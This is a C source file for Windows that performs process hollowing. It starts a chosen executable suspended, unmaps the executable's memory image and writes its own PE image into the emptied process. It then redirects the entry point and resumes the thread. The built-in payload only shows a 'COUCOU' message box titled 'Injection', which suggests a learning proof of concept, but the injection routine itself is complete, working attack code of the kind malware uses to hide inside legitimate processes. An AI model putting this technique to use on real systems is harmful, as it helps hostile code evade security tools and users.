#include <Windows.h>
#include <stdio.h>

static DWORD get_size(HANDLE file_handle) {
	LARGE_INTEGER size;

	if (GetFileSizeEx(file_handle, &size) == 0) {
		fprintf(stderr, "Could not get file size because %d\n", GetLastError());
		return 0;
	}
	return size.LowPart;
}

static PWSTR get_self_filename() {
	PWSTR self_filename;
	DWORD ret;

	self_filename = malloc(MAX_PATH * sizeof(WCHAR) + 1);
	if (NULL == self_filename) {
		fprintf(stderr, "Could not allocate memory because: %d\n", GetLastError());
		goto exit;
	}

	ret = GetModuleFileNameW(NULL, self_filename, MAX_PATH * sizeof(WCHAR));
	if (0 == ret) {
		fprintf(stderr, "Could not get self file name because: %d\n", GetLastError());
		self_filename = NULL;
	}
exit:
	return self_filename;
}

/* Get a file handle to ourselves */
static HANDLE open_self_disk() {
	PWSTR self_filename = NULL;
	HANDLE file_handle = NULL;

	self_filename = get_self_filename();
	if (NULL == self_filename) {
		goto clean_exit;
	}

	file_handle = CreateFileW(self_filename, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (INVALID_HANDLE_VALUE == file_handle) {
		fprintf(stderr, "Could not open self file because %d\n", GetLastError());
		file_handle = NULL;
		goto clean_exit;
	}

clean_exit:
	if (NULL != self_filename) {
		free(self_filename);
	}
	return file_handle;
}

/* Read the PE on disk */
static PBYTE get_self_bytes() {
	HANDLE file_handle;
	DWORD len, bytes_read, ret;
	PBYTE self_content = NULL;

	file_handle = open_self_disk();
	if (NULL == file_handle) {
		goto clean_exit;
	}

	len = get_size(file_handle);
	if (0 == len) {
		goto clean_exit;
	}

	self_content = malloc(len * sizeof(BYTE));
	if (NULL == self_content) {
		fprintf(stderr, "Could not allocate memory because %d\n", GetLastError());
		goto clean_exit;
	}

	ret = ReadFile(file_handle, self_content, len, &bytes_read, NULL);
	if (FALSE == ret) {
		fprintf(stderr, "Could not read file because %d\n", GetLastError());
		if (NULL != self_content) {
			free(self_content);
		}
		self_content = NULL;
		goto clean_exit;
	}
	else if (bytes_read != len) {
		fprintf(stderr, "Could not read file because %d\n", GetLastError());
		if (NULL != self_content) {
			free(self_content);
		}
		self_content = NULL;
		goto clean_exit;
	}

clean_exit:
	if (NULL != file_handle) {
		CloseHandle(file_handle);
	}
	return self_content;
}

static DWORD unmap_base_address(HANDLE process, PVOID base_address) {
	DWORD ret = 0;

	HMODULE ntdll_handle = GetModuleHandleA("ntdll");
	if (NULL == ntdll_handle) {
		ret = 1;
		goto exit;
	}
	FARPROC NtUnmapViewOfSection_address = GetProcAddress(ntdll_handle, "NtUnmapViewOfSection");

	typedef NTSTATUS(WINAPI * _NtUnmapViewOfSection)(
		HANDLE ProcessHandle,
		PVOID BaseAddress
		);
	_NtUnmapViewOfSection nt_unmap_view_of_section = (_NtUnmapViewOfSection)NtUnmapViewOfSection_address;

	ret = nt_unmap_view_of_section(process, base_address);
	if (0 != ret) {
		ret = 1;
	}

exit:
	return ret;
}

static VOID suspend_self() {
	HANDLE Thread;

	Thread = GetCurrentThread();
	if ((SuspendThread(Thread)) == -1) {
		fprintf(stderr, "Could not SuspendThread because %d\n", GetLastError());
	}
}

DWORD wmain(DWORD argc, PWCHAR* argv) {
	WCHAR target[MAX_PATH];
	PBYTE self_bytes = NULL;
	DWORD ret;
	CONTEXT context = { 0 };
	PVOID target_base_address = NULL;

	if (argc < 2) {
		printf("hello world\n");
		ret = MessageBoxA(NULL, "COUCOU", "Injection", MB_OK);
		suspend_self();
		return 0;
	}

	fgetws(target, MAX_PATH, stdin);
	target[wcslen(target) - 1] = 0;

	/* We start by creating our target process in suspended mode */
	STARTUPINFO startup_info = { 0 };
	PROCESS_INFORMATION target_info = { 0 };
	ret = CreateProcessW(target, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &startup_info, &target_info);
	if (FALSE == ret) {
		fprintf(stderr, "Could not create process because: %d\n", GetLastError());
		ret = -1;
		goto clean_exit;
	}

	/* Now we get our child's context in order to manipulate thread status and gather informations like PEB address */
	context.Ebx = 1;
	context.ContextFlags = CONTEXT_FULL;
	ret = GetThreadContext(target_info.hThread, &context);
	if (FALSE == ret) {
		fprintf(stderr, "Could not get thread context: %d\n", GetLastError());
		ret = -1;
		goto clean_exit;
	}

	/* Time to read our child's PEB address and base address */
	ret = ReadProcessMemory(target_info.hProcess, (PVOID)(context.Ebx + 8), &target_base_address, sizeof(PVOID), NULL); // DoubleCheck OK
	if (FALSE == ret) {
		fprintf(stderr, "Could not get base addresss\n");
		ret = -1;
		goto clean_exit;
	}

	/* Now we get the address of NtUnmapViewOfSections so that we may clear the PE memory of its content */
	ret = unmap_base_address(target_info.hProcess, target_base_address);
	if (0 != ret) {
		fprintf(stderr, "Could not unmap base address of target\n");
		goto clean_exit;
	}

	/* After this, we go and allocate the necessary memory in our target */
	self_bytes = get_self_bytes();
	if (NULL == self_bytes) {
		ret = -1;
		goto clean_exit;
	}

	PIMAGE_DOS_HEADER injected_dos_header = (PIMAGE_DOS_HEADER)self_bytes;
	PIMAGE_NT_HEADERS injected_nt_headers = (PIMAGE_NT_HEADERS)((PBYTE)self_bytes + injected_dos_header->e_lfanew);
	target_base_address = VirtualAllocEx(target_info.hProcess, (LPVOID)target_base_address, injected_nt_headers->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (NULL == target_base_address) {
		fprintf(stderr, "could not alocate memory in child process: %d\n", GetLastError());
		ret = -1;
		goto clean_exit;
	}

	/* We start writing our headers in in the remote process */
	ret = WriteProcessMemory(target_info.hProcess, target_base_address, (PVOID)self_bytes, injected_nt_headers->OptionalHeader.SizeOfHeaders, NULL);
	if (FALSE == ret) {
		fprintf(stderr, "could not write memory in child process: %d\n", GetLastError());
		ret = -1;
		goto clean_exit;
	}

	/* Now we write all our sections in the target PE's memory */
	DWORD sections_start = injected_dos_header->e_lfanew
		+ sizeof(injected_nt_headers->Signature)
		+ sizeof(injected_nt_headers->FileHeader)
		+ injected_nt_headers->FileHeader.SizeOfOptionalHeader;

	PIMAGE_SECTION_HEADER section = { 0 };
	for (DWORD i = 0; i < injected_nt_headers->FileHeader.NumberOfSections; i++) {
		section = (PIMAGE_SECTION_HEADER)(PVOID)(((DWORD)self_bytes + sections_start) + (i * sizeof(*section)));
		ret = WriteProcessMemory(target_info.hProcess, (PVOID)((DWORD)(target_base_address) + section->VirtualAddress), (PVOID)((DWORD)self_bytes + section->PointerToRawData), section->SizeOfRawData, NULL);
		if (FALSE == ret) {
			ret = -1;
			goto clean_exit;
		}
	}

	/* Now that we dumped all our sections, we need to rewrite the PE's base address */
	ret = WriteProcessMemory(target_info.hProcess, (PVOID)(context.Ebx + 8), &(PVOID)target_base_address, sizeof(PVOID), NULL);
	if (FALSE == ret) {
		ret = -1;
		goto clean_exit;
	}
	/* We also update our entry point */
	context.Eax = (DWORD)target_base_address + injected_nt_headers->OptionalHeader.AddressOfEntryPoint;

	/* Finaly we can restore the thread context and resume our child */
	ret = SetThreadContext(target_info.hThread, &context);
	if (FALSE == ret) {
		fprintf(stderr, "Could set thread context because: %08X\n", GetLastError());
		ret = -1;
		goto clean_exit;
	}

	ret = ResumeThread(target_info.hThread);
	if (FALSE == ret) {
		fprintf(stderr, "Could not resume thread because: %08X\n", GetLastError());
		ret = -1;
		goto clean_exit;
	}
	printf("coucou\n");
	ret = 0;
clean_exit:
	if (NULL != self_bytes) {
		free(self_bytes);
	}

	/* Close remaining handles */
	if (INVALID_HANDLE_VALUE != target_info.hProcess) {
		CloseHandle(target_info.hProcess);
	}
	if (INVALID_HANDLE_VALUE != target_info.hThread) {
		CloseHandle(target_info.hThread);
	}
	return ret;
}
